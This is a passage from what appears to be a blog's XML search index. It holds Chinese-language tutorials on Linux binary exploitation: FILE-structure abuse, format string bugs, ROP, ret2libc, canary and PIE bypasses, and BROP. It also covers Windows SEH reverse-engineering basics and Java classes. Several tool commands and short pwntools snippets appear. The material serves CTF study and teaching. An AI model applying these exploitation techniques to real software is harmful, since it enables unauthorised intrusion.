__libc_message -&gt; __GI_abort -&gt; _IO_flush_all_lockp -&gt; __GI__IO_str_overflow.其他利用类似. 任意地址读写IO函数会通过文件结构体的以下指针来读写数据,通过覆盖原有的stdout等结构体指针就可以任意地址读写(或者伪造一个一样的). 1234567891011char* _IO_read_ptr;char* _IO_read_end;char* _IO_read_base;//readchar* _IO_write_base;char* _IO_write_ptr;char* _IO_write_end;//writechar* _IO_buf_base;char* _IO_buf_end;//buf scanf读取输入会先放到_IO_buf_base缓冲区中,劫持该指针可以任意写,其他IO函数同理. 以下是任意地址读的条件. 以下是任意地址写的条件.]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>Linux-pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞分析-Linux-pwn-格式化字符串漏洞]]></title>
    <url>%2Fposts%2F33625faa%2F</url>
    <content type="text"><![CDATA[概念当printf等格式化字符串函数的第一个参数用户可控时,即可任意读写.这就是格式化字符串漏洞. 原理格式化字符串的格式如下. 1%[parameter][flags][width][.precision][length]type parameter:n$,使用第n个参数.flags:在width设置后指定可以用来作为填充的内容之类的内容.width:最小输出长度.precision:最大输出长度.length:参数长度,h,ll.配合type. 其中type即相应变量的类型. d/i,有符号整数. u,无符号整数. x/X,16进制unsigned int.(如果指定了精度,则输出的数字不足时在左侧补0.默认精度1.精度为0且值为0,则输出为空.) o,8进制unsigned int.(如果指定了精度,则输出的数字不足时在左侧补0.默认精度1.精度为0且值为0,则输出为空.) s,如果没有用l标志,输出字符串直到精度规定的上限.用了l标志表示函数参数指向wchar_t型的数组,输出时把每个宽字符转化为多字节字符,相当于调用wcrtomb函数. c,如果没有用l标志,把int参数转为unsigned char型输出(参数传递时char会被隐式转化为int);如果用了l标志,把wint_t参数转为包含两个元素的wchart_t数组,其中第一个元素包含要输出的字符,第二个元素为null宽字符. C,ISO宽字符. p,void *型,用地址的格式输出对应变量的值. n,不输出字符,但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量,printf超过0x2000个字节之后%n会写不了值.(格式化字符串漏洞任意写) %,&#39;%&#39;字面值. f,输出十进制记数法float变量. e/E,输出科学记数法double变量. a/A,输出十六进制记数法double变量(C99). 常用%p,%x,%n,%s搭配其他限定符读写数据. 利用这里分两种情况. 第一种是格式化字符串在调用的格式化字符串函数的栈帧之上(即可以作为格式化控制符解析参数),这种情况基本上可以测出偏移后利用%num$x,%num$n任意读任意写. 第二种是格式化字符串不可作为解析参数.就只能利用栈上的参数进行读写.]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>Linux-pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞分析-Linux-pwn-栈溢出概览]]></title>
    <url>%2Fposts%2Fc50e49f5%2F</url>
    <content type="text"><![CDATA[概念栈溢出指由于程序使用了不安全的函数或逻辑错误,导致攻击者溢出栈中缓冲区破坏(篡改)其他数据. 可以看到在栈中,位于局部变量(溢出点)后面的有:部分其他局部变量,返回地址,和所有的之前的栈帧.栈溢出可以让攻击者劫持PC register(eip/rip). 有时候要劫持ebp(即被保存的栈指针)来控制栈的位置从而劫持控制流. 利用方法可执行的代码有两种,进程内存空间本身的代码(包括程序代码,动态库代码,甚至错误偏移产生的代码等等)和攻击者写进去的shellcode(如果程序没有开启DEP,也就是NX). 利用前者的方法也叫做面向返回编程(Return-Oriented Programming,缩写:ROP).即攻击者控制堆栈调用以劫持程序控制流并执行针对性的机器语言指令序列(称为gadget).gadget通常结束于ret指令.对于动态库代码中的gadget需要先泄露libc基址(绕过ASLR). 1234ROPgadget --binary [fileName] | grep "pop rdi"#寻找对应二进制文件pop rdi的gadgetROPgadget --binary [fileName] --string /bin/sh#寻找对应二进制文件中字符串的偏移 根据不同的程序保护机制,要采用不同的漏洞利用方法.(ASLR基本都是默认开启) Return-2-Shellcode如果程序未开启NX,可以直接写shellcode到栈(或者堆,bss等可控区域)上,如果能泄露对应地址(通过缓冲区泄露)就可以通过偏移直接ret到shellcode上,或者寻找jmp esp(32位)这种gadget控制PC register(eip/rip)到栈上. Return-2-libc其实就是指利用libc中的函数来获取shell,最典型的就是system(&quot;/bin/sh&quot;);.这个可以用来绕过DEP. 这种利用的前提是已经泄露了一个libc地址(如果是动态链接,静态链接直接ROP即可).这样就能绕过ASLR获得system的地址. 1234libc = ELF("libc.so")off_system = libc.symbols['write'] - libc.symbols['system']system_addr = write_addr - off_system#write_addr是泄露的函数地址,其他函数也行,只要有对应的动态库文件或者其偏移信息 也可以用工具获得动态库的导出函数偏移. 12nm -D libc.so | grep "system"objdump -T libc.so | grep "system" 具体libc信息可以通过LibcSearcher确定. Return-2-csu64bit要控制rdi等寄存器才能控制参数.使用工具ROPgadget --binary pwn可以找到pop rdi; ret;等gadget.其他和32bit类似. ROPgadget的--ropchain可以自动化生成ROP链(一般都用不了). /bin/sh的地址也可以用ROPgadget找到. 1ROPgadget --binary ./pwn --string /bin/sh 而实际上这就是Return-2-csu,因为libc_init_cus函数中就有控制rdi和rsi的gadget,还有组合起来可以控制rdx的gadget. vDSO-and-vsyscall由于使用int 0x80进行系统调用效率低,Intel和AMD分别实现了sysenter/sysexit和syscall/sysret(快速系统调用指令). 为了兼容这两种快速系统调用指令和未实现快速系统调用指令的CPU,Linux实现了vsyscall,程序调用vsyscall,具体的选择由内核来决定.而vsyscall的实现就在vDSO中. vsyscall在每个进程中静态分配在相同的地址,只允许4个系统调用,gettimeofday,time和getcpu.由内核提供功能. vDSO(Virtual Dynamic Shared Object,虚拟动态共享对象)是指内核和用户空间共享的代码空间,动态分配,地址随机(栈上的环境变量中存在这个地址),提供超过4个系统调用,由glibc库提供功能. 12dumpmem vdso.so 0x00007ffff7ffd000 ​0x00007ffff7fff000#vDSO映射的是一整个ELF文件 x86_64从AMD引进了syscall指令,但是vDSO,vsyscall的机制依旧未变. vsyscall执行时会进行检查,如果不是从函数开头执行的话就会出错,所以一般只能用于平滑跳转,类似于shellcode中nop的作用. vDSO常用于寻找系统调用指令或者搭配srop,x86环境下vDSO只有一字节是random,也就是1/256的命中率,范围为0xf7700000 ~ 0xf7800000. 绕过PIE泄露一个属于该可执行文件里的内容的地址从而求出基址,或者使用部分覆盖. 还有一种思路是利用vDSO和vsyscall. 绕过canary 泄露,通过栈泄露或者格式化字符串等方式. 对于有fork的进程,子进程canary值是一样的,就可以逐位爆破. 劫持__stack_chk_fail,或者更深层的调用. __stack_chk_fail会将argv[0]输出,通过劫持这个参数泄露内容. 直接劫持控制流不进行canary检测. 栈溢出足够多的数据来复写TLS中的tcbhead_t.stack_guard的值,从而bypass canary. 在glibc2.23下mmap一个合适堆可以分配到TLS结构上方附近,再通过堆溢出即可覆盖TLS中的tcbhead_t.stack_guard的值,例如:32位下malloc(1024*130),此时堆指针到tcbhead_t.stack_guard的偏移为:0x216FC. BROP基于没有二进制文件这种情况而产生的一系列技术. 其思路为触发漏洞后通过回显或者连接状态得出信息.常见漏洞有栈溢出和格式化字符串漏洞. 格式化字符串漏洞发现后即可泄露栈上数据并任意地址读写. 主要研究栈溢出漏洞. 如果存在栈溢出的函数调用后还有输出或者其他操作,可以通过递增输入长度得到返回地址的偏移. 知道返回地址偏移后就可以通过测试不同的gadget得出一些有用的gadget. 最重要的是stop gadget,即不会使程序crash且有一定特征的gadget.可以利用这种gadget去寻找需要的gadget. stack pivot需要存在类似pop esp; ret;等栈迁移gadget,作用是将栈迁移到可控区域从而使第二次ROP链的内容更可控. 其他具体环境不同设计,重要就是找到可写区域,可读区域和可执行区域然后通过构造ROP链等操作获得shell.]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>Linux-pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞分析-Linux-pwn-基础]]></title>
    <url>%2Fposts%2F507ee6ce%2F</url>
    <content type="text"><![CDATA[概述漏洞是在硬件,软件,协议的具体实现或系统安全策略上存在的缺陷,从而可以使攻击者能够在未授权的情况下访问或破坏系统.二进制漏洞就是指机器代码层面的漏洞. pwn即二进制漏洞利用,通过漏洞来提升权限或得到shell或达到某种目的. 预备知识前期主要为:x86/x86-64架构下Linux平台的C语言,汇编语言,python(写利用脚本),Linux常用操作,操作系统原理. 不同CPU架构下的Linux在利用上区别大多体现在汇编语言(严格说是ISA)层面. 常见二进制漏洞非法写常见的有堆溢出,栈溢出和数据段溢出. 比如gets函数:从stdio流中读取字符串,直至接受到换行符或EOF时停止,并将读取的结果存放在buffer指针所指向的内存(字符指针)中.换行符不作为读取串的内容,读取的换行符被转换为&#39;\0&#39;空字符. 然而函数的设计者没有考虑如果输入的内容超过字符数组的长度会怎么样. 从C语言可以知道,指针的值是一个地址,大部分时候字符串数组都是局部变量,而局部变量存储在栈中,并且内存大小确定.那么如果输入的内容超过字符数组的长度,则数组本身的内存就容不下这么多”字符”了,就会溢出到其他内存.而发生在栈中的溢出就叫做栈溢出,由于栈的设计和函数调用的设计,使得栈溢出可以造成很大的危害. 常见的危险函数:gets,scanf,strcpy,sprintf,memcpy,strcat等. 与其类似的还有数组越界,read函数的size参数过大等等.这一类漏洞的特点就是用户可以通过输入修改一些程序设计者不想其修改的数据,甚至还有程序逻辑的缺陷(栈溢出中易实现). 非法读这种漏洞也叫做泄露,这种漏洞主要作用是泄露信息以方便绕过程序保护机制,有的时候也可以直接通过泄露获取目的信息. 12345//某函数内char a[16];read(0, a, 160);puts(a); 上述代码生成的程序如果输入中不带\0,那么就会输出栈中数据(遇\0截断),比如栈地址,残留libc地址,canary等. 栈地址可以用来通过相对地址差求出缓冲区等栈上的地址,从而设计并利用漏洞.残留libc地址可以用来通过二进制文件函数和全局变量偏移固定求出加载机制(常用在libc). 这些运用的原理都是基于虽然随机化了段加载的基址,但同一个段中偏移固定. 函数实现缺陷典型例子. abs(0x80000000) == 0x80000000;. scanf(&quot;%d&quot;, &amp;x);,如果输入+\n会导致scanf正常执行但是不改变x. 整数溢出当程序中的数据超过其数据类型的范围就会造成溢出,整数类型的溢出被称为整数溢出.这种情况可能会导致越界写等漏洞. 条件竞争条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序,这些不受控制的事件没有按照开发者想要的方式运行时,就会出现bug. 条件竞争需要如下的条件. 并发,即至少存在两个并发执行流.这里的执行流包括线程,进程,任务等级别的执行流. 共享对象,即多个并发流会访问同一对象.常见的共享对象有共享内存,文件系统,信号.称访问共享对象的代码为临界区,在正常写代码时这部分应该加锁. 改变对象,即至少有一个控制流会改变竞争对象的状态.因为如果程序只是对对象进行读操作,那么并不会产生条件竞争. 典型的有文件读写的问题. 程序的运行以ELF文件的运行为例.当执行./test时发生了什么. shell读取命令发现这是一个执行命令.调用fork()并在子进程中执行execve(&quot;./test&quot;, *argv[], *envp[]). execve系统调用会使进程陷入内核态,调用sys_execve -&gt; do_execve -&gt; ...(sys_execve检测execve的后两个参数,do_execve判断文件类型并调用对应的处理器),最后调用load_elf_binary解析文件头,如果程序为动态链接则通过.interp确定加载器路径,然后通过程序头表加载ELF文件,最后修改sys_execve返回地址返回用户态(动态链接返回ld.so的entry point,静态链接返回ELF的entry point)). 动态链接情况下,ld.so会进行映射共享库,初始化GOT等操作,最后返回ELF的entry point. ELF的entry point一般为_start,负责将环境变量指针,.init指针和.fini指针传给libc_start_main函数. libc_start_main函数依次调用.init,main,.fini,最后执行exit结束程序的运行. 栈栈是一片内存区域,本质上是一个内核数据结构,保存了一个函数调用时所需要的维护信息,包括局部变量,返回地址,函数参数等.从栈底开始(也就是最开始)保存的依次为运行的环境变量,命令行参数,函数栈帧. 也可以说栈是程序时用来保存局部变量,返回地址和其他需要保存的值的一片内存区域(也是一个FILO的数据结构). 其栈顶的值保存在寄存器esp(32位环境),栈底的值由操作系统决定.且栈顶小于栈底,也就是说栈是向下增长的. 延时绑定首先编译程序可以选择动态链接和静态链接. 静态链接把所有使用的函数库函数(一般一个函数一个文件)链接到目标文件,这样会让可执行文件大小变大,同时运行时物理内存中会多次映射同一个函数,但运行速度快. 延时绑定基于动态链接,动态链接并不把目标文件和函数库文件链接在一起,而是等到程序在装载或运行过程中链接函数库.(这样用同一函数库的进程可以共用这个函数库,节约内存和磁盘) 动态链接会在调用库函数的地方打桩(stub),然后通过plt和dl_runtime_resolve函数实现,链接后地址存储在.got表. 延时绑定有以下特点. 最开始.got表表项不是真正的函数地址.在第一次调用触发延时绑定后才被改为真正的地址. 调用库函数时会将.got表表项当做函数地址. 每个plt表项都是一段对对应库函数的调用代码. 线程局部存储TLS是为了避免多个线程同时访存同一全局变量或者静态变量时所导致的冲突,尤其是多个线程同时需要修改这一变量时. 通过TLS机制为每一个使用该全局变量的线程都提供一个变量值的副本,每一个线程均可以独立地改变自己的副本,而不会和其它线程的副本冲突.这个机制在不同的架构和操作系统上的实现不同. x86-64的linux中由glibc实现该机制,在glibc实现中,每个线程有一个对应的结构体tcbhead_t,被指向段寄存器fs(x86-64). 1234567891011typedef struct &#123; void *tcb; dtv_t *dtv; void *self; int multiple_threads; int gscope_flag; uintptr_t sysinfo; uintptr_t stack_guard; uintptr_t pointer_guard; //...&#125; tcbhead_t; 线程在pthread_create的帮助下创建,然后给这个新线程选择TLS,为栈分配内存后glibc在内存的高地址初始化TLS,在x86-64架构上,栈向下增长,将TLS放在栈顶部. 从TLS中减去一个特定的常量值得到被新线程的stack register所使用的值.从TLS到pthread_create的函数参数传递栈帧的距离小于一页. 加载其他版本ld和libc123456789101112131415161718192021222324from pwn import *def change_ld(binary, ld): binary = ELF(binary) for segment in binary.segments: if segment.header['p_type'] == 'PT_INTERP': size = segment.header['p_memsz'] addr = segment.header['p_paddr'] data = segment.data() if size &lt;= len(ld): log.failure("Failed to change PT_INTERP from &#123;&#125; to &#123;&#125;".format(data, ld)) return None binary.write(addr, ld.ljust(size, '\0')) if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn') path = '/tmp/pwn/&#123;&#125;_debug'.format(os.path.basename(binary.path)) if os.access(path, os.F_OK): os.remove(path) info("Removing exist file &#123;&#125;".format(path)) binary.save(path) os.chmod(path, 0b111000000) return ELF(path)elf = change_ld('./chall', './ld-2.29.so')r = elf.process(env = &#123;'LD_PRELOAD' : './libc-2.29.so'&#125;) 运行与调试不同架构程序对于不同架构的程序可以通过qemu和对应动态库运行. 12qemu-arm -L /usr/arm-linux-gnueabi -g 1234 ./pwnqemu-aarch64 -L /usr/aarch64-linux-gnu -g 1234 ./pwn 调试. 123gdb-multiarchfile pwntarget remote :1234 根据需要安装共享库.以mips为例. 1apt-cache search "libc6" | grep mips 程序保护由于二进制漏洞日益增多,相应的产生了很多保护机制. 使用checksec检测程序保护措施. 1checksec [fileName] ASLRAddress Space Layout Randomization(地址空间随机化). 随机生成进程地址空间(例如栈,库和基于brk的堆)的关键部分的起始地址. 由/proc/sys/kernel/randomize_va_space决定,有以下三种情况. 0 - 表示关闭进程地址空间随机化. 1 - 表示将mmap的基址,stack和vDSO页面随机化. 2 - 表示在1的基础上增加heap的随机化. Off2lib Linux Kernel &lt; 3.18. PIE enabled情況下image之间的offset固定. 可由code image推出所有mapping. kernel版本不同offset也有差异. Fixed kernel &gt;= 3.18. 无法由code段推出libc位置. 但可以用libc推出mmap及其他Library的位置. stack Canary在栈中保存的ebp和局部变量之间维护一个变量,函数执行完的时候检测这个值是否改变来检测栈是否被破坏.(这个值每个进程唯一). Linux程序的Canary保护是通过gcc编译选项来控制的. -fstack-protector:启用堆栈保护.不过只为局部变量中含有char数组的函数插入保护代码. -fstack-protector-strong:启用堆栈保护.比前者广. -fstack-protector-all:启用堆栈保护,为所有函数插入保护代码. -fno-stack-protector:禁用堆栈保护,为默认选项. 这个值会先存放在TLS区段的tcbhead_t结构中,x86架构中寄存器gs指向该结构,x86-64中寄存器fs指向该结构. NX属于DEP技术,堆栈不可执行,防止shellcode的执行.早期通过jmp esp这一特殊的机器代码,使控制流到栈上,然后在栈上写shellcode. 通过映射页的时候设置页的rwx属性中的x实现,可以通过mprotect函数改变页属性从而执行shellcode,或者使用ROP绕过. gcc编译器默认开启了NX选项,如果需要关闭NX选项,可以添加-z execstack参数. PIE地址无关可执行文件,可执行文件每次运行加载的基址随机化,需要操作系统支持. fPIE不能用于编译库(so),PIE默认不开启,-no-pie显式关闭. 12345gcc -o test test.c // 默认情况下,不开启PIEgcc -fpie -pie -o test test.c // 开启PIE,此时强度为1gcc -fPIE -pie -o test test.c // 开启PIE,此时为最高强度2gcc -fpic -o test test.c // 开启PIC,此时强度为1,不会开启PIEgcc -fPIC -o test test.c // 开启PIC,此时为最高强度2,不会开启PIE RELRORelocation Read-Only,重定位表只读. 具体选项:Disabled,.got/.got.plt都可写;Partial,got表可写;Full,got表不可写. 1234gcc -o test test.c // 默认情况下,是Partial RELROgcc -z norelro -o test test.c // 关闭,即No RELROgcc -z lazy -o test test.c // 部分开启,即Partial RELROgcc -z now -o test test.c // 全部开启,即Full RELRO FORTIFY用于检查是否存在缓冲区溢出的错误,限制%n等格式化操作符,针对的是字符串,内存操作函数,例如memcpy,memset,strcpy,strcats,snprintf等等. 123$ gcc -o test test.c // 默认不会开启检查$ gcc -D_FORTIFY_SOURCE=1 -o test test.c // 仅在编译时检查$ gcc -D_FORTIFY_SOURCE=2 -o test test.c // 在程序运行时也会检查,如果判断到缓冲区溢出则会直接终止程序]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>Linux-pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-逆向分析-Windows-基础]]></title>
    <url>%2Fposts%2Fc620b982%2F</url>
    <content type="text"><![CDATA[概述逆向分析有静态分析与动态分析. 静态分析是指根据反汇编得到的程序清单进行分析,最常用的是从交互处入手,常用的静态分析工具有IDA等. 动态分析是指利用OllyDbg或WinDbg等调试工具跟踪分析,这样就能分析软件在执行过程中的中间结果(而且部分软件会对程序大部分代码加密). 而高效的动态分析应该注意以下两点: 粗跟踪,指在调试时避过不需要的地方(CALL,REP,LOOP等),而是跟踪程序的主逻辑. 细跟踪,在需要关心和分析的地方进行具体的跟踪分析. Windows操作系统Windows应用程序的基本架构:Everything is window,按钮,文本框,标签,选项卡等.一个图形界面的程序由多个窗口组成,每个元素被分配了一个句柄. Win32 API简述每个操作系统都会对工作在其上的应用程序员提供API,即提供应用程序运行所需要的窗口管理,图形设备接口,内存管理等服务的函数. Win API就是以函数库的形式组织在一起的Windows应用程序编程接口.Win API子系统负责将API调用转换为Windows系统的系统服务调用.用于16位Windows系统的称为Win16,用于32位Windows系统的称为Win32,而64位系统的功能和名称都基本没有变化,只是用64位代码实现. Windows运转的核心是动态链接,Windows提供的函数调用(API)采用动态链接库实现.比如提供操作系统核心功能服务.包括进程,线程控制,内存管理,文件访问等功能的KERNEL32.DLL. 在NT架构下Win32 API接受ASCII和Unicode两种字符集.(开发过程中开发工具会通过设置自动选择) 消息机制Windows是一个消息驱动式系统,Windows消息提供应用程序和应用程序之间,应用程序与操作系统之间的通信手段(SendMessage函数). 应用程序的功能由消息触发,通过对消息的响应和处理完成. Windows系统有两种消息队列: 系统消息队列. 应用程序消息队列. 虚拟内存虚拟内存实现方法与过程: 当一个应用程序启动,操作系统创建一个进程,并给该进程分配2GB的虚拟地址. 虚拟内存管理器将应用程序的代码映射到其虚拟地址对应的位置,并将当前需要的代码读入物理地址. 如果使用DLL,DLL也会被映射到进程的虚拟地址空间中,需要时才会被读入物理内存. 其他项目(数据,堆栈等)的空间是从物理内存分配,并被映射到虚拟地址空间中. 应用程序通过使用其虚拟地址空间的地址开始执行,然后虚拟地址管理器把每次内存访问映射到物理地址上. 调试符号调试符号是被调试程序的二进制信息与源程序信息之间的桥梁,是源文件编译期间生成的用于支持调试的副产品,包括变量,类型,函数名,源代码行等.一般由符号表(调试符)记录这部分信息. 现在最常用的符号格式为PDB,是由微软设计的未公开格式,其符号根据应用程序不同的链接方式保存在一个或多个文件中. DBG为系统调试符,链接器并不创建DBG文件,微软将操作系统调试符分配在DBG文件中(如ntdll.dbg,kernel32.dbg). MAP文件是程序全局符号,源文件和代码行号信息的唯一文本表示方法,具有极高的通用性. MS-DOS和16位Windows(现在的Windows 9x)使用SYM格式的调试符.COFF格式由Windows NT 2.1首次使用.CodeView格式最早是MS-DOS下作为Microsoft C/C++ 7的一部分出现,现已支持Win32. 动态分析主要通过OllyDbg等动态调试器. 硬件断点原理硬件断点和DRx调试寄存器有关.DRx调试寄存器共有8个(0~7).其中DR0~DR3为调试地址寄存器,保存需要监视的地址.DR4~DR5保留.DR6为调试寄存器组状态寄存器,DR7为调试寄存器组控制寄存器. 反调试程序检测自身是否正在被调试,如果检测到正在被调试的话,就会结束自身进程或者不按常规流程运行,这就是反调试技术. 常见的可以使用API函数IsDebuggerPresent检测,该函数是被Kernel32.dll导出的,没有参数,如果当前程序正在被调试的话,返回值为1,没有被调试的话,返回值为0. 逆向分析基础PE格式PE是Portable Executable File Format简写,它是目前Windows平台上的主流可执行文件格式.Microsoft Visual C++提供的WINNT.H里有PE数据结构的完整定义. SEHSEH(Structured Exception Handling)是windows异常处理机制之一,是基于线程的异常处理,在程序源代码中使用__try,__except,__finally来实现SEH异常处理. 123456789__try&#123; guarded body of code&#125;__except(Condition)&#123; identifies an exception&#125;__finally&#123; identifies a termmination handle&#125; Windows下有多种异常处理:VEH,VCH,SEH,UEF.处理异常的优先级为:调试器,VEH,SEH,UEF,VCH. 常见的异常有:企图读写一个不可访问的地址;触发断点;企图执行一个无效的指令;除0;标志寄存器的TF位为1(单步调试); 当异常发生的时候程序会抛出异常,系统检测到异常就会进行异常处理,首先保存当前进程的基本信息,然后会去寻找异常句柄(Exception Handling)来处理异常.当前上下文的信息会被存储在一个叫做CONTEXT的结构体中,这些信息用于再完成异常处理后继续进程.异常的信息都被存储在一个叫做EXCEPTION_RECORD的结构体中. 123456void WINAPI RaiseException( _In_ DWORD dwExceptionCode,//表示当前线程的发生异常的原因(例如读写保护地址,数组越界并且能够被检查到等等). _In_ DWORD dwExceptionFlags,//表示当前的异常发生后,是否进行执行. _In_ DWORD nNumberOfArguments,//lpArguments数组中的参数个数 _In_ const ULONG_PTR *lpArguments); 1234typedef struct _EXCEPTION_POINTERS &#123; PEXCEPTION_RECORD ExceptionRecord;//指向ExceptionRecord的指针,里面记载了一个独立于机器的异常行为 PCONTEXT ContextRecord;//指向记录了异常上下文结构体的指针&#125; EXCEPTION_POINTERS, *PEXCEPTION_POINTERS; 123456789101112131415161718192021222324252627typedef struct _CONTEXT &#123; DWORD ContextFlags; DWORD Dr0; DWORD Dr1; DWORD Dr2; DWORD Dr3; DWORD Dr6; DWORD Dr7; FLOATING_SAVE_AREA FloatSave; DWORD SegGs; DWORD SegFs; DWORD SegEs; DWORD SegDs; DWORD Edi; DWORD Esi; DWORD Ebx; DWORD Edx; DWORD Ecx; DWORD Eax; DWORD Ebp; DWORD Eip; DWORD SegCs;//MUST BE SANITIZED DWORD EFlags;//MUST BE SANITIZED DWORD Esp; DWORD SegSs; BYTE ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];&#125; CONTEXT; 12345678typedef struct _EXCEPTION_RECORD &#123; DWORD ExceptionCode;//异常码:以STATUS_或EXCEPTION_开头,可自定义. DWORD ExceptionFlags;//异常标志:0可修复;1不可修复;2正在展开,不要试图修复. struct _EXCEPTION_RECORD *ExceptionRecord;//指向嵌套的异常结构,通常是异常中又引发异常. PVOID ExceptionAddress;//异常发生地址 DWORD NumberParameters;//下面ExceptionInformation所含有的dword数目 ULONG_PTR ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];//附加消息&#125; EXCEPTION_RECORD; SEH是由_EXCEPTION_REGISTRATION_RECORD结构体组成的链表,第一个异常处理中未处理相关异常,它就会被传递到下一个异常处理器,直到得到处理. 123456typedef struct _EXCEPTION_REGISTRATION_RECORD &#123; struct _EXCEPTION_REGISTRATION_RECORD *Next; //指向下一个节点的指针,直到遇到0xFFFFFFFF结束 PEXCEPTION_ROUTINE Handler; //异常处理函数指针&#125; 异常处理函数定义,是一个由系统调用的回调函数. 123456typedef _IRQL_requires_same_ _Function_class_(EXCEPTION_ROUTINE) EXCEPTION_DISPOSITION NTAPI EXCEPTION_ROUTINE ( _Inout_ struct _EXCEPTION_RECORD *ExceptionRecord, _In_ PVOID EstablisherFrame,//当前SEH栈的起始位置 _Inout_ struct _CONTEXT *ContextRecord, _In_ PVOID DispatcherContext); SEH链表是结构体NT_TIB的第一个结构体成员,结构体NT_TIB是TEB的第一个结构体成员,所以SEH链表指针位于FS:[0]的位置. SEH异常处理过程. 还可以扩展异常处理帧结构,也就是scope table域.其会在栈中保存一个GSCookie用于防御栈溢出,然后异常处理函数_except_handler4会调用HandlerFunc函数,这里是没有检测的. 12345678910111213struct _EH4_SCOPETABLE &#123; DWORD GSCookieOffset; DWORD GSCookieXOROffset; DWORD EHCookieOffset; DWORD EHCookieXOROffset; _EH4_SCOPETABLE_RECORD ScopeRecord[1];&#125;;struct _EH4_SCOPETABLE_RECORD &#123; DWORD EnclosingLevel; long (*FilterFunc)(); void (*HandlerFunc)();//处理函数&#125;; SEH安装. 123push @_except_handler ;异常处理器push dword ptr fs:[0] ;取出SEH链表头mov dword ptr fs:[0],esp ;添加链表 SEH卸载. 12pop dword ptr fs:[0] ;还原链表头add esp,4 ;删除异常处理器]]></content>
      <categories>
        <category>binary</category>
        <category>逆向分析</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pl-java-类与对象]]></title>
    <url>%2Fposts%2Fb3fd5bb7%2F</url>
    <content type="text"><![CDATA[概念类是构造对象的模板,由类构造对象的过程称为创建类的实例.用Java编写的所有代码都位于某个类的内部. 对象中的数据称为实例域,操纵数据的过程称为方法.类和对象是封装的体现. 在Java中所有的类都源自一个Object超类,通过扩展一个类建立另一个类的过程称为继承. OOPOOP与POP不同,首先从设计类开始,然后再往每个类中添加方法.描述一个类,名词往往对应实例域,动词对应方法.而类的实例,也就是对象有三个主要特性:行为,状态,标识. 类之间常见的关系有依赖,聚合和继承. 对象与类使用构造器(特殊的方法)构造对象的实例,通过声明变量并赋值引用来使用对象的实例. 注意,变量不是对象,未初始化的变量也没有引用任何对象.局部变量不会自动的初始化为null. Java的变量可以看作C++的对象指针. 访问控制符 public:对任何类的任何方法可见. private:只有本类的方法可以访问. proteced:对所有子类(包括本类)及同一个包中的所有其他类都可见.(C++中没有包这个概念,只对本类及所有子类可见) 默认:对本包可见. 构造器构造器与类同名,没有返回类型(其实是返回类的实例).类可以有一个及以上的构造器.构造器总是伴随new操作符使用(C++中为单独使用). 隐式参数this类的非静态方法都有一个隐式参数,即调用这个方法的类的实例,可以使用this参数访问该实例的数据,也可以直接用实例域的标识符访问. C++和Java的方法都可以访问所属类的私有特性,而不限于隐式参数的私有特性. 传参Java分两种参数类型,基本数据类型和对象引用,Java参数为传值调用. final域final修饰符指明该实例域构建对象时必须初始化这个域且之后不能更改(同C++的const).大多应用于基本类型域. 静态域和静态方法一个类的静态域有且只有一个(普通实例域每个类都有一个自己的备份). 静态方法不能操作对象(因为静态方法并没有自己所属的对象),但可以访问自己的静态域. 这两者使用static声明,解释为:属于类且不属于类对象的函数和变量. 可以使用静态工厂方法来生成不同风格的格式化对象,静态方法的调用不需要对象实例. 重载在同一名称空间使用相同的名字,不同的参数的多个方法就产生了重载.(所以完整描述一个方法需要指出方法名字和参数类型,称为函数的签名) 初始化如果没有在构造器显式的给域赋初值,那么域会被初始化为默认值:0,false,null(这一点与局部变量不同). 当类没有提供构造器时,系统会提供一个默认的无参构造器. Java还可以显式域初始化(C++11也行),例如:private int id = 1;. 与实例域同名的参数会屏蔽实例域. 如果构造器的第一个语句形如this(...),这个构造器将会调用同一个类的另一个构造器(类似功能在C++11中使用委托构造函数实现). 除了在构造器初始化或者使用显式域初始化,Java支持初始化块这一机制. 12345678910class A&#123; //实例域 &#123; //初始化块内容 &#125; //其他&#125; 而当调用构造器时,具体初始化步骤如下: 所有数据域被默认初始化. 按照类声明的次序,依次执行所有域初始化语句和初始化块. 执行构造器主体或调用第二个构造器并返回此步. finalize方法Java有自动的垃圾回收器,所有不需要析构器.但可以为类添加finalize方法,其会在垃圾回收器清除对象前调用(但具体调用时间未知). 包Java使用包将类组织起来.对编译器来说,嵌套的包没有任何关系. 一个类可以使用所属包的所有类,以及其他包的公有类. 可以通过import来引用包含在包中的类(import static导入静态方法与静态域),从而简化引用.或者显式的写出包名(还可以导入静态方法,静态域或其他特定的方法或域). 通过package &lt;packageName&gt;来将一个类放入包中. 对象包装器Java为每个基本类型设计了一个对应的final类,Integer,Long,Float,Double,Short,Byte,Character,Void,Boolean(前六个类派生于公共超类Number). 而且Java对其支持自动装箱机制,如下(注意包装器类不能实现修改数值参数,因为这种对象是不可变的). 1234Integer n = 3;//编译器会将其变为:Integer n = Integer.valueOf(3);int a = n;//编译器会将其变为:int a = n.intValue();]]></content>
      <categories>
        <category>programming language</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-ciscn-2019-quals-pwn]]></title>
    <url>%2Fposts%2F2234866d%2F</url>
